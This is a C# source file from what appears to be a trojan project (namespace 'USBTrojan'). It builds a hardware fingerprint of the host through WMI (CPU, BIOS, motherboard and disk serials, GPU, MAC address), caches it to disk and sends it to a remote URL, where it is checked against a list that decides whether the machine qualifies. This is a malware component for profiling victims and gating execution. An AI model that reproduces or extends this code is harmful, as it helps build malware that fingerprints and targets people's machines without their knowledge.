using System;
using System.IO;
using System.Collections.Generic;
using System.Text;
using System.Globalization;
using System.Linq;
using System.Security.Cryptography;
using System.Management;
using System.Net;

namespace USBTrojan
{
    class HWID
    {
        // copypasted from StackOverflow
        private static string _fingerPrint = string.Empty;
        private const string HWIDCachePath = "x.bin";

        public static string GetHWID()
        {
            if (Config.HWIDCacheEnabled && File.Exists(HWIDCachePath))
            {
                _fingerPrint = File.ReadAllText(HWIDCachePath);
            }

            if (string.IsNullOrEmpty(_fingerPrint))
            {
                _fingerPrint = GetHash("CPU >> " + CpuId() +
                    "\nBIOS >> " + BiosId() +
                    "\nBASE >> " + BaseId() +
                    "\nDISK >> " + DiskId() +
                    "\nVIDEO >> " + VideoId() +
                    "\nMAC >> " + MacId());

                if (Config.HWIDCacheEnabled)
                {
                    File.WriteAllText(HWIDCachePath, _fingerPrint);
                }
            }
            return _fingerPrint;
        }
        
        public static bool CheckHWID()
        {
            string hwid = GetHWID();
            var client = new WebClient();
            try
            {
                var response = client.DownloadString(string.Format(Config.HWIDListURL, hwid));
                if (Config.HWIDMode == 0)
                {
                    var list = response.Split('\n');
                    return !list.Contains(hwid);
                }
                else if (Config.HWIDMode == 1)
                {
                    return response.Contains("good");
                }
            }
            catch (WebException ex)
            {
                // Handle exception
                Console.WriteLine(ex.Message);
            }
            return false;
        }
        
        private static string GetHash(string s)
        {
            MD5 sec = new MD5CryptoServiceProvider();
            byte[] bt = Encoding.ASCII.GetBytes(s);
            return GetHexString(sec.ComputeHash(bt));
        }

        private static string GetHexString(IList<byte> bt)
        {
            string s = string.Empty;
            for (int i = 0; i < bt.Count; i++)
            {
                byte b = bt[i];
                int n = b;
                int n1 = n & 15;
                int n2 = (n >> 4) & 15;
                if (n2 > 9)
                    s += ((char)(n2 - 10 + 'A')).ToString(CultureInfo.InvariantCulture);
                else
                    s += n2.ToString(CultureInfo.InvariantCulture);
                if (n1 > 9)
                    s += ((char)(n1 - 10 + 'A')).ToString(CultureInfo.InvariantCulture);
                else
                    s += n1.ToString(CultureInfo.InvariantCulture);
                if ((i + 1) != bt.Count && (i + 1) % 2 == 0) s += "-";
            }
            return s;
        }
        
        private static string Identifier(string wmiClass, string wmiProperty, string requirement)
        {
            var result = "";
            var mc = new ManagementClass(wmiClass);
            var moc = mc.GetInstances();
            foreach (ManagementBaseObject mo in moc)
            {
                if (mo[requirement].ToString() != "True" || result != "")
                {
                    continue;
                }
                try
                {
                    result = mo[wmiProperty].ToString();
                    break;
                }
                catch
                { }
            }
            return result;
        }

        private static string Identifier(string wmiClass, string wmiProperty)
        {
            string result = "";
            var mc = new ManagementClass(wmiClass);
            var moc = mc.GetInstances();
            foreach (ManagementBaseObject mo in moc)
            {
                if (result != "")
                {
                    continue;
                }
                try
                {
                    result = mo[wmiProperty].ToString();
                    break;
                }
                catch
                { }
            }
            return result;
        }
        
        private static string CpuId()
        {
            string retVal = Identifier("Win32_Processor", "UniqueId");
            if (retVal != "") return retVal;
            retVal = Identifier("Win32_Processor", "ProcessorId");
            if (retVal != "") return retVal;
            retVal = Identifier("Win32_Processor", "Name");
            if (retVal == "")
            {
                retVal = Identifier("Win32_Processor", "Manufacturer");
            }
            retVal += Identifier("Win32_Processor", "MaxClockSpeed");
            return retVal;
        }
        
        private static string BiosId()
        {
            return Identifier("Win32_BIOS", "Manufacturer") + Identifier("Win32_BIOS", "SMBIOSBIOSVersion") + Identifier("Win32_BIOS", "IdentificationCode") + Identifier("Win32_BIOS", "SerialNumber") + Identifier("Win32_BIOS", "ReleaseDate") + Identifier("Win32_BIOS", "Version");
        }
        
        private static string DiskId()
        {
            return Identifier("Win32_DiskDrive", "Model") + Identifier("Win32_DiskDrive", "Manufacturer") + Identifier("Win32_DiskDrive", "Signature") + Identifier("Win32_DiskDrive", "TotalHeads");
        }
        
        private static string BaseId()
        {
            return Identifier("Win32_BaseBoard", "Model") + Identifier("Win32_BaseBoard", "Manufacturer") + Identifier("Win32_BaseBoard", "Name") + Identifier("Win32_BaseBoard", "SerialNumber");
        }
        
        private static string VideoId()
        {
            return Identifier("Win32_VideoController", "DriverVersion") + Identifier("Win32_VideoController", "Name");
        }

        private static string MacId()
        {
            return Identifier("Win32_NetworkAdapterConfiguration", "MACAddress", "IPEnabled");
        }
    }
}
